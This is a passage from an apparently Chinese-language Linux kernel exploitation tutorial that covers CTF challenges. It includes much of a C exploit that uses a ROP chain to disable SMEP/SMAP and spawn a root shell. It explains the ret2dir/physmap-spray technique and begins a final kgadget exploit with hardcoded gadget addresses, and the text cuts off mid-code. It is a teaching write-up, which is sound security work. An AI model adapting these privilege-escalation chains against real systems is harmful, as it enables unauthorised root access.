<span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds_ptr = commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred_ptr = prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br><br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + offset;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可完成提权</p><p><a href="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png"><img src="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png" alt="image.png"></a></p><blockquote><p>这里笔者选择的 CPU 型号 <code>qemu64-v1</code> 其实是在我们不指定时 QEMU 默认使用的 CPU 型号，但是你可以看到一般的比赛使用的都是 <code>kvm64</code> 这一型号，我们可以使用如下命令查看 QEMU 可用的 CPU 型号及说明</p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl">$ qemu-system-x86_64 -cpu help<br>Available CPUs:<br><span class="hljs-meta">...</span><br>x86 kvm64                 (alias configured by machine type)<br><span class="hljs-meta">...</span><br>x86 qemu64-v1             QEMU Virtual CPU version 2.5+<br><span class="hljs-meta">...</span><br><br>SH<br></code></pre></div></td></tr></table></figure><p>因此大家默认会使用 <code>kvm64</code> 这一型号，那么为什么这里笔者要特意指定成 <code>qemu64-v1</code> 呢，这是因为笔者发现其他型号的 CPU <strong>在关闭 smep、smap 后仍无法正常地 ret2usr</strong>，会在访问用户空间时触发缺页异常</p><p><a href="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png"><img src="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png" alt="image.png"></a></p><p>造成这种现象的原因是因为<strong>KPTI 机制，对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限</strong>，因此当内核尝试执行用户空间代码时，由于对应页顶级表项没有设置可执行位，因此会直接 panic</p><p>kpti 在 <code>qemu64-v1</code> 上默认是关闭的，但在其他型号 CPU 上默认是开启的，所以这里笔者选用该型号来作为修改 cr4 进行 smep/smap bypass 的例题，<strong>但实际上 ret2usr 已经是过去式了</strong></p></blockquote><h1 id="Kernel-ROP-ret2dir"><a href="#Kernel-ROP-ret2dir" class="headerlink" title="Kernel ROP - ret2dir"></a>Kernel ROP - ret2dir</h1><blockquote><p><del>笔者第一次见这个名字的时候还以为是 return to directory：返回至文件夹的攻击，但现在仔细想来至少英文猜的差不多对</del>（</p></blockquote><p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见此处<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf</a></p><p>我们首先来思考一下 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">x86 下的 Linux kernel 的内存布局</a>，存在着这样的一块区域叫做 <code>direct mapping area</code>，即内核的 <code>线性映射区</code>，<strong>线性地直接映射了整个物理内存空间</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs RST">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)<br></code></pre></div></td></tr></table></figure><blockquote><p>好像也没有啥译名，但是叫直接映射区太难听，因为这块映射是线性的（linear），笔者就一直叫他线性映射区</p><blockquote><p>在 32 位下这块区域似乎只能占 896 MB，虽然 32 位下有最大 4G 的内存空间，不过虽然同样是线性映射区， 32 位和 64 位的内存布局还是有些许不同的，这里我们主要还是关注 64 位</p></blockquote><p>笔者猜测：buddy system 应当是通过这块映射来管理整个物理内存空间的，尚未查证过源码</p><p>这里我们也可以看出 Linux 在 4级页表（地址长度 48 bit）下的最大内存应当为 64 TB 而并非 256 TB，至于为什么缩水了那么多那是另一个故事…</p><p>当需要用到大于 64 TB 的内存时，就要开启 5 级页表了，这种情况比较复杂，这里我们就先不深入讨论</p></blockquote><p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框</p><p>当开启了 SMEP、SMAP、PXN 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong></p><p>下图便是原论文中对 ret2dir 这种攻击的示例，我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址<strong>在内核空间中访问到</strong></p><p><a href="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png"><img src="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png" alt="image.png"></a></p><p>但需要注意的是<strong>在新版的内核当中 direct mapping area 已经不再具有可执行权限</strong>，因此我们很难再在用户空间直接布置 shellcode 进行利用，<strong>但我们仍能通过在用户空间布置 ROP 链的方式完成利用</strong></p><p><a href="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png"><img src="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png" alt="image.png"></a></p><blockquote><p>基本上布置 shellcode 的方法已经很难直接完成利用了，毕竟这是一篇14年的古老论文，稍微新一点的内核的 direct mapping area 都不再具有可执行权限…</p></blockquote><p>比较朴素的一种使用 ret2dir 进行攻击的手法便是：</p><ul><li>利用 mmap 在用户空间大量喷射内存</li><li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），<strong>这个地址直接来自于线性映射区</strong></li><li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存</li></ul><p><strong>此时我们就获得了一个映射到用户空间的内核空间地址，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段</strong></p><p>需要注意的是我们往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code></p><blockquote><p>还是建议大家把论文原文看一遍23333</p></blockquote><h2 id="例题：MINI-LCTF2022-kgadget"><a href="#例题：MINI-LCTF2022-kgadget" class="headerlink" title="例题：MINI-LCTF2022 - kgadget"></a>例题：MINI-LCTF2022 - kgadget</h2><blockquote><p>笔者在校内赛出的一道题目，算是一道 ret2dir 的例题，<del>因为网上实在是没有这一块的题目…</del></p><p><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">点击下载-kgadget.tar.xz</a></p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>还是惯例的给了个有漏洞的驱动，逆起来其实并不难，唯一有用的就是 ioctl，若 ioctl 的第二个参数为 114514 则会将第三个参数作为指针进行解引用，取其所指地址上值作为函数指针进行执行（这里编译器将其优化为 <code>__x86_indirect_thunk_rbx()</code> ，其实本质上就是 <code>call rbx</code> ）</p><p><a href="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png"><img src="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png" alt="image.png"></a></p><p>在启动脚本中开启了 smep 与 smap 保护，所以我们不能够直接在用户空间构造 rop 然后 ret2usr，但是由于没有开启 kaslr，所以我们也不需要泄露内核基址</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64,+smep,+smap \<br>    -smp cores=2,threads=2 \<br>    -kernel bzImage \<br>    -initrd ./rootfs.cpio \<br>    -nographic \<br>    -monitor /dev/null \<br>    -snapshot \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \<br>    -no-reboot<br></code></pre></div></td></tr></table></figure><h3 id="漏洞利用：ret2dir-physmap-spray"><a href="#漏洞利用：ret2dir-physmap-spray" class="headerlink" title="漏洞利用：ret2dir + physmap spray"></a>漏洞利用：ret2dir + physmap spray</h3><p>因为我们没法直接在内核空间直接找到一个这样的目标（内核空间中虽然存在能够这样进行调用的函数指针，例如 tty 设备默认的函数表<code>ptm_unix98_ops</code> 一类的，但是这些函数表对应的函数指针对我们来说没有用），所以我们需要手动去<strong>在内核空间布置我们的函数指针与 rop chain</strong>，之后我们传入我们布置的 gadget 的地址就能进行利用了</p><p>那么我们如何在内核空间布置我们的恶意数据呢？可能有的人就会想到 <code>msg_msg</code> 、<code>sk_buff</code> 等一系列常用来进行堆喷的结构体，<strong>但其实我们并不需要显式地在内核空间布置数据，而是可以通过一个位于内核空间中的地址直接访问到用户空间中的数据</strong>——那就是映射了整个物理内存的 <code>direct mapping area</code></p><p>我们不难想到的是，<strong>我们为用户空间所分配的每一张内存页，在内核空间中都能通过这块内存区域访问到</strong>，因此我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong></p><blockquote><p>当然，使用 <code>msg_msg</code> 或者 <code>sk_buff</code> 在内核空间中布置恶意数据也可以，不过在笔者看来对这题而言是多此一举…</p></blockquote><p>那么现在又出现一个新的问题，<strong>我们如何得知我们布置的恶意数据在内核空间中的对应地址呢？</strong>我们无法进行内核空间中的内存搜索，因此也就无法直接得知我们布置的恶意数据在内核空间中的地址</p><p><strong>答案是不需要搜索</strong>，这里我们使用<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">原论文</a>中的一种名为 <code>physmap spray</code> 的攻击手法——<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个 direct mapping area 上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong></p><p>经笔者实测当我们喷射的内存页数量达到一定数量级时<strong>我们总能准确地在 direct mapping area 靠中后部的区域命中我们的恶意数据</strong></p><p>最后就是 gadget 的挑选与 rop chain 的构造了，我们不难想到的是可以通过形如 <code>add rsp, val ; ret</code> 的 gadget 跳转到内核栈上的 <code>pt_regs</code> 上，在上面布置提权的 rop chain，但在本题当中 <code>pt_regs</code> 只有 r9 与 r8 两个寄存器可用，笔者提前对内核栈进行了清理——</p><p><a href="https://s2.loli.net/2022/05/07/xik67DJWKez9FNl.png"><img src="https://s2.loli.net/2023/02/06/iNdgfh1LPs7aStx.png" alt="image.png"></a></p><blockquote><p>编译器优化成了 qmemcpy，其实笔者源码里是逐个寄存器赋值的</p></blockquote><p>但其实仅有两个寄存器也够用了，我们可以利用 <code>pop_rsp ; ret</code> 的 gadget 进行栈迁移，<strong>将栈迁移到我们在用户空间所布置的恶意数据上</strong>，随后我们直接在恶意数据靠后的位置布置提权降落回用户态的 rop chain 即可</p><p>由于 buddy system 以页为单位进行内存分配，所以笔者也以页为单位进行 physmap spray，以求能消耗更多的物理内存，提高命中率，这里笔者懒得去计算偏移了，所以在每张内存页上布置的都是“三段式”的 rop chain，将我们跳转到 <code>pt_regs</code> 的 gadget 同时用作 slide code——</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASCIIDOC"><span class="hljs-code">------------------------</span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret</span><br><span class="hljs-code">...</span><br><span class="hljs-code">add rsp, val ; ret # 该gadget必定会命中下一个区域中的一条ret，之后便能平缓地“滑”到常规的提权 rop 上</span><br><span class="hljs-code">------------------------</span><br>ret<br>ret<br><span class="hljs-bullet">...</span><br><span class="hljs-bullet"></span><span class="hljs-section">ret</span><br><span class="hljs-section">------------------------</span><br><span class="hljs-section">common root ROP chain</span><br><span class="hljs-section">------------------------</span><br></code></pre></div></td></tr></table></figure><h3 id="final-exploit"><a href="#final-exploit" class="headerlink" title="final exploit"></a>final exploit</h3><p>最后的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-keyword">size_t</span>  prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-keyword">size_t</span>  commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-keyword">size_t</span>  init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-keyword">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-keyword">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-keyword">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-keyword">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-keyword">void</span>    (*kgadget_ptr)(<span class="hljs-keyword">void</span>);<br><span class="hljs-keyword">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-keyword">size_t</span>  page_size;<br><span class="hljs-keyword">size_t</span>     try_hit;<br><span class="hljs-keyword">int</span>     dev_fd;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">constructROPChain</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-keyword">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span 